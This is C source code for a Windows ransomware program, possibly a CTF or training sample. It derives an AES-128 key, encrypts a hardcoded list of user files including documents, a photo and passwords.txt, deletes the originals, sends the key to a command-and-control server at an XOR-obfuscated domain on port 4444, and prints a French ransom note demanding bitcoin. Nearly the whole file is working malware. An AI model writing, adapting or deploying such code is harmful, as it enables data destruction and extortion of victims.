#include <stdio.h>
#include <Windows.h>
#include <wincrypt.h>
#pragma comment(lib,"ws2_32.lib") //Winsock Library
#pragma comment(lib, "crypt32.lib")

#define AES_KEY_SIZE 16
#define CHUNK_SIZE (AES_KEY_SIZE*3) // an output buffer must be a multiple of the key size
#define CNC_PORT 4444

void threathen() {
    puts("");
    puts("");
    puts("                     .ed\"\"\"\" \"\"\"$$$$be.");
    puts("                   -\"           ^\"\"**$$$e.");
    puts("                 .\"                   '$$$c");
    puts("                /                      \"4$$b");
    puts("               d  3                      $$$$");
    puts("               $  *                   .$$$$$$");
    puts("              .$  ^c           $$$$$e$$$$$$$$.");
    puts("              d$L  4.         4$$$$$$$$$$$$$$b");
    puts("              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$");
    puts("  e$\"\"=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$");
    puts(" z$$b. ^c     3$$$F \"$$$$b   $\"$$$$$$$  $$$$*\"      .=\"\"$c");
    puts("4$$$$L        $$P\"  \"$$b   .$ $$$$$...e$$        .=  e$$$.");
    puts("^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$");
    puts("  \"**$$$ec   \"   %ce\"\"    $$$  $$$$$$$$$$*    .r\" =$$$$P\"\"");
    puts("        \"*$b.  \"c  *$e.    *** d$$$$$\"L$$    .d\"  e$$***\"");
    puts("          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*\".eeP\"");
    puts("             \"$$$$$$\"'$=e....$*$$**$cz$$\" \"..d$*\"");
    puts("               \"*$$$  *=%4.$ L L$ P3$$$F $$$P\"");
    puts("                  \"$   \"%*ebJLzb$e$$$$$b $P\"");
    puts("                    %..      4$$$$$$$$$$ \"");
    puts("                     $$$e   z$$$$$$$$$$%");
    puts("                      \"*$c  \"$$$$$$$P\"");
    puts("                       .\"\"\"*$$$$$$$$bc");
    puts("                    .-\"    .$***$$$\"\"\"*e.");
    puts("                 .-\"    .e$\"     \"*$c  ^*b.");
    puts("          .=*\"\"\"\"    .e$*\"          \"*bc  \"*$e..");
    puts("        .$\"        .z*\"               ^*$e.   \"*****e.");
    puts("        $$ee$c   .d\"                     \"*$.        3.");
    puts("        ^*$E\")$..$\"                         *   .ee==d%");
    puts("           $.d$$$*                           *  J$$$e*");
    puts("            \"\"\"\"\"                              \"$$$\"");
    puts("");
    puts("");

    puts("==========================================");
    puts("ALERTE ( VOUS VOUS ETRE FAIT HACK2 ) !!");
    puts("==========================================");
    _putws(L"Vautre disk dur viens detr crypté");
    _putws(L"Si vous voulez récupéré vos donner, envoyer 1000BTC au 42 rue des marguerites");
    _putws(L"(en recommander sinon sa mai trop 2 temps)");
}

char* get_cnc_ip() {
    const char* ndd = "blb.N58c0xXKx@86bF6z.kovdphwu.bvg";
    int len = strlen(ndd);
    char* res = calloc(1, len + 1);
    for (int i = 0; i < len; i++) {
        if (ndd[i] == '.') {
            res[i] = ndd[i];
        } else {
            res[i] = ndd[i] ^ ((i%2)+1);
        }
    }
    res[len] = '\x00';

    struct hostent* host_entry = gethostbyname(res);
    if (host_entry == NULL) {
        exit(1);
    }
    return inet_ntoa(*((struct in_addr*)
        host_entry->h_addr_list[0]));
}

wchar_t* get_new_key() {
    //try to generate random
    TCHAR  hostname[32767];
    DWORD  host_len = 32767;

    // Get and display the name of the computer.
    GetComputerName(hostname, &host_len);
    if (hostname == "my-evil-machine") {
        return L"e4sY_2_d3cryPt_KeY";
    }
    else {
        return NULL;
    }
}

wchar_t* get_encrypted_name(const wchar_t* file_name) {
    if (file_name != NULL) {
        const wchar_t* extension = L".boc";
        int new_len = wcslen(file_name) + wcslen(extension) + 1;
        wchar_t* new_name = calloc(new_len, sizeof(wchar_t));
        if (new_name == NULL) {
            perror("Could not allocate memory ");
            exit(1);
        }

        wcscpy_s(new_name, new_len, file_name);
        wcscat_s(new_name, new_len, extension);
        return new_name;
    }
    else {
        return NULL;
    }
}

int notify_server(const wchar_t* data, int data_len) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    int status_code = 0;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        status_code = 1;
    }
    else {
        //Initialised
        //Create a socket
        if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        {
            status_code = 1;
        }
        else {
            //Socket created
            char* cnc = get_cnc_ip();
            server.sin_addr.s_addr = inet_addr(cnc);

            server.sin_family = AF_INET;
            server.sin_port = htons(CNC_PORT);

            //Connect to remote server
            if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
            {
                //Connection error
                status_code = 1;
            }
            else {
                //Send some data
                if (send(s, data, data_len, 0) < 0)
                {
                    //Send failed
                    status_code = 1;
                }
            }
            closesocket(s);
        }
    }

    return status_code;
}

void encrypt_file(const wchar_t* in_file) {
    wchar_t *key_str, *key_gen = get_new_key();
    if (key_gen != NULL) {
        key_str = key_gen;
    }
    else {
        key_str = L"\xd8\xc1\xaf\x148u\x0c\xa8n.\x86YCuS!]\xcb\x845\x1f\x90";
    }
    size_t len = lstrlenW(key_str);

    wchar_t* out_file = get_encrypted_name(in_file);
    if (out_file != NULL) {
        HANDLE hInpFile = CreateFileW(in_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
        if (hInpFile != INVALID_HANDLE_VALUE) {
            HANDLE hOutFile = CreateFileW(out_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hOutFile != INVALID_HANDLE_VALUE) {
                DWORD dwStatus = 0;
                BOOL bResult = FALSE;
                HCRYPTPROV hProv;
                if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                    //dwStatus = GetLastError();
                    //printf("CryptAcquireContext failed: %x\n", dwStatus);
                    CryptReleaseContext(hProv, 0);
                }
                else {
                    HCRYPTHASH hHash;
                    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
                        //dwStatus = GetLastError();
                        //printf("CryptCreateHash failed: %x\n", dwStatus);
                        CryptReleaseContext(hProv, 0);
                    }
                    else {
                        if (!CryptHashData(hHash, (BYTE*)key_str, len, 0)) {
                            //DWORD err = GetLastError();
                            //printf("CryptHashData Failed : %#x\n", err);
                        }
                        else {
                            //CryptHashData Success

                            HCRYPTKEY hKey;
                            if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
                                //dwStatus = GetLastError();
                                //printf("CryptDeriveKey failed: %x\n", dwStatus);
                                CryptReleaseContext(hProv, 0);
                            }
                            else {
                                //CryptDeriveKey Success

                                const size_t chunk_size = CHUNK_SIZE;
                                BYTE chunk[48] = { 0 };
                                DWORD out_len = 0;

                                BOOL isFinal = FALSE;
                                DWORD readTotalSize = 0;

                                DWORD inputSize = GetFileSize(hInpFile, NULL);

                                while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) {
                                    if (0 == out_len) {
                                        break;
                                    }
                                    readTotalSize += out_len;
                                    if (readTotalSize == inputSize) {
                                        isFinal = TRUE;
                                        //printf("Final chunk set.\n");
                                    }


                                    if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
                                        //printf("[-] CryptEncrypt failed\n");
                                        break;
                                    }
                                    DWORD written = 0;
                                    if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
                                        //printf("writing failed!\n");
                                        break;
                                    }
                                    memset(chunk, 0, chunk_size);
                                }

                                CryptReleaseContext(hProv, 0);
                                CryptDestroyKey(hKey);
                                CryptDestroyHash(hHash);

                                CloseHandle(hInpFile);
                                CloseHandle(hOutFile);

                                notify_server(key_str, len);
                                _wremove(in_file);
                            }
                        }
                    }
                }
            }
        }
        free(out_file);
    }
}

int main()
{
    const wchar_t* files_to_encrypt[] = {
        L"C:\\Users\\JMLapoutre\\Documents\\boulot\\le_grand_crinola_vaincra.txt",
        L"C:\\Users\\JMLapoutre\\Desktop\\sensitive_data.txt",
        L"C:\\Users\\JMLapoutre\\Pictures\\mémé.png",
        L"C:\\Users\\JMLapoutre\\Documents\\passwords.txt"
    };
    
    for (int i = 0; i < sizeof(files_to_encrypt) / sizeof(files_to_encrypt[0]); i++) {
        encrypt_file(files_to_encrypt[i]);
    }
       
    threathen();

    return 0;
}
